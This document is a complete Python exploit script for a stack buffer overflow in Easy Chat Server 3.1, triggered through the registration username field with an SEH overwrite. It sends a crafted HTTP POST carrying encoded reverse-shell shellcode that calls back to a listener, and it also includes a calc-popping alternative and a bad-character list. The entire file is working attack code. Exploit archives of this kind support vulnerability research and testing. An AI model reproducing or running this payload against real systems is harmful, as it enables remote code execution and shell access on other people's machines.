# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: Easy Chat Server 3.1 BoF [Registration Request: Username] - SEH
# OS		: Windows XP SP3
# Date		: 25/03/2018

# Note		: Exploit breaks in debugger. Run ECS as standalone.

import sys
import struct
from socket import create_connection as cc
import time

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 80

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()
# 00 25 2B
bad = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x26\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 -f c -b "\x00\x25\x2B" -e x86/shikata_ga_nai
# 351 Bytes
shellcode_rev = ("\xd9\xf7\xd9\x74\x24\xf4\xbb\x34\xf5\xf2\xa3\x5f\x31\xc9\xb1"
"\x52\x31\x5f\x17\x83\xef\xfc\x03\x6b\xe6\x10\x56\x6f\xe0\x57"
"\x99\x8f\xf1\x37\x13\x6a\xc0\x77\x47\xff\x73\x48\x03\xad\x7f"
"\x23\x41\x45\x0b\x41\x4e\x6a\xbc\xec\xa8\x45\x3d\x5c\x88\xc4"
"\xbd\x9f\xdd\x26\xff\x6f\x10\x27\x38\x8d\xd9\x75\x91\xd9\x4c"
"\x69\x96\x94\x4c\x02\xe4\x39\xd5\xf7\xbd\x38\xf4\xa6\xb6\x62"
"\xd6\x49\x1a\x1f\x5f\x51\x7f\x1a\x29\xea\x4b\xd0\xa8\x3a\x82"
"\x19\x06\x03\x2a\xe8\x56\x44\x8d\x13\x2d\xbc\xed\xae\x36\x7b"
"\x8f\x74\xb2\x9f\x37\xfe\x64\x7b\xc9\xd3\xf3\x08\xc5\x98\x70"
"\x56\xca\x1f\x54\xed\xf6\x94\x5b\x21\x7f\xee\x7f\xe5\xdb\xb4"
"\x1e\xbc\x81\x1b\x1e\xde\x69\xc3\xba\x95\x84\x10\xb7\xf4\xc0"
"\xd5\xfa\x06\x11\x72\x8c\x75\x23\xdd\x26\x11\x0f\x96\xe0\xe6"
"\x70\x8d\x55\x78\x8f\x2e\xa6\x51\x54\x7a\xf6\xc9\x7d\x03\x9d"
"\x09\x81\xd6\x32\x59\x2d\x89\xf2\x09\x8d\x79\x9b\x43\x02\xa5"
"\xbb\x6c\xc8\xce\x56\x97\x9b\x30\x0e\x94\xd9\xd9\x4d\x9a\xdc"
"\xa2\xdb\x7c\xb4\xc4\x8d\xd7\x21\x7c\x94\xa3\xd0\x81\x02\xce"
"\xd3\x0a\xa1\x2f\x9d\xfa\xcc\x23\x4a\x0b\x9b\x19\xdd\x14\x31"
"\x35\x81\x87\xde\xc5\xcc\xbb\x48\x92\x99\x0a\x81\x76\x34\x34"
"\x3b\x64\xc5\xa0\x04\x2c\x12\x11\x8a\xad\xd7\x2d\xa8\xbd\x21"
"\xad\xf4\xe9\xfd\xf8\xa2\x47\xb8\x52\x05\x31\x12\x08\xcf\xd5"
"\xe3\x62\xd0\xa3\xeb\xae\xa6\x4b\x5d\x07\xff\x74\x52\xcf\xf7"
"\x0d\x8e\x6f\xf7\xc4\x0a\x9f\xb2\x44\x3a\x08\x1b\x1d\x7e\x55"
"\x9c\xc8\xbd\x60\x1f\xf8\x3d\x97\x3f\x89\x38\xd3\x87\x62\x31"
"\x4c\x62\x84\xe6\x6d\xa7")

shellcode_calc = ("\xdb\xc1\xd9\x74\x24\xf4\x5e\x56\x59\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b"
"\x4c\x79\x78\x4b\x32\x67\x70\x33\x30\x75\x50\x33\x50\x6b\x39"
"\x58\x65\x35\x61\x4b\x70\x55\x34\x6e\x6b\x50\x50\x64\x70\x4e"
"\x6b\x50\x52\x56\x6c\x4e\x6b\x71\x42\x72\x34\x6c\x4b\x42\x52"
"\x44\x68\x66\x6f\x6c\x77\x43\x7a\x47\x56\x66\x51\x4b\x4f\x4c"
"\x6c\x75\x6c\x33\x51\x73\x4c\x33\x32\x56\x4c\x45\x70\x59\x51"
"\x4a\x6f\x56\x6d\x33\x31\x6a\x67\x4d\x32\x39\x62\x53\x62\x43"
"\x67\x4e\x6b\x31\x42\x42\x30\x4e\x6b\x71\x5a\x35\x6c\x4e\x6b"
"\x62\x6c\x34\x51\x50\x78\x39\x73\x57\x38\x56\x61\x7a\x71\x30"
"\x51\x6e\x6b\x51\x49\x55\x70\x73\x31\x6a\x73\x6e\x6b\x72\x69"
"\x75\x48\x4d\x33\x67\x4a\x31\x59\x4e\x6b\x57\x44\x4e\x6b\x75"
"\x51\x6e\x36\x34\x71\x39\x6f\x6e\x4c\x5a\x61\x38\x4f\x66\x6d"
"\x65\x51\x58\x47\x54\x78\x69\x70\x52\x55\x6b\x46\x55\x53\x33"
"\x4d\x39\x68\x67\x4b\x31\x6d\x46\x44\x70\x75\x59\x74\x62\x78"
"\x6c\x4b\x52\x78\x76\x44\x63\x31\x4b\x63\x43\x56\x4c\x4b\x66"
"\x6c\x70\x4b\x4e\x6b\x70\x58\x47\x6c\x63\x31\x4b\x63\x4e\x6b"
"\x74\x44\x4c\x4b\x37\x71\x58\x50\x6b\x39\x77\x34\x57\x54\x46"
"\x44\x53\x6b\x71\x4b\x75\x31\x32\x79\x52\x7a\x56\x31\x49\x6f"
"\x6d\x30\x31\x4f\x31\x4f\x53\x6a\x4c\x4b\x47\x62\x48\x6b\x4c"
"\x4d\x61\x4d\x61\x7a\x37\x71\x6c\x4d\x4b\x35\x58\x32\x67\x70"
"\x73\x30\x77\x70\x66\x30\x65\x38\x34\x71\x4c\x4b\x50\x6f\x4c"
"\x47\x4b\x4f\x79\x45\x6d\x6b\x5a\x50\x38\x35\x79\x32\x33\x66"
"\x62\x48\x69\x36\x6a\x35\x4f\x4d\x4f\x6d\x4b\x4f\x4e\x35\x35"
"\x6c\x76\x66\x51\x6c\x77\x7a\x4f\x70\x6b\x4b\x6b\x50\x44\x35"
"\x64\x45\x6d\x6b\x61\x57\x76\x73\x51\x62\x52\x4f\x50\x6a\x67"
"\x70\x70\x53\x6b\x4f\x39\x45\x52\x43\x61\x71\x42\x4c\x51\x73"
"\x47\x70\x41\x41")

shellcode = shellcode_rev

payload = ""
payload += "POST /registresult.htm HTTP/1.1\r\n"
payload += "Host: 192.168.3.131\r\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
payload += "Accept-Language: en-US,en;q=0.5\r\n"
payload += "Referer: http://192.168.3.131/register.ghp\r\n"
payload += "Connection: close\r\n"
payload += "Upgrade-Insecure-Requests: 1\r\n"
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: 182\r\n"
payload += "\r\n"
payload += "UserName={}&Password=blah&Password1=blah&Sex=2&Email=blah%40blah.com&Icon=0.gif&Resume=blah&cw=1&RoomID=%3C%21--%24RoomID--%3E&RepUserName=%3C%21--%24UserName--%3E&submit1=Register\r\n"

#crash = "A"*400
# PPR 10017F21
SEH = p(0x10017F21)
nSEH = "\xEB\x06\x90\x90"
crash = "A"*217 + nSEH + SEH + "\x90"*16 + shellcode + "D"*(1200 - 217 - 8 - len(shellcode) - 16)


print "Sending UB3R Payl0ad :D"
sock.send(payload.format(crash))

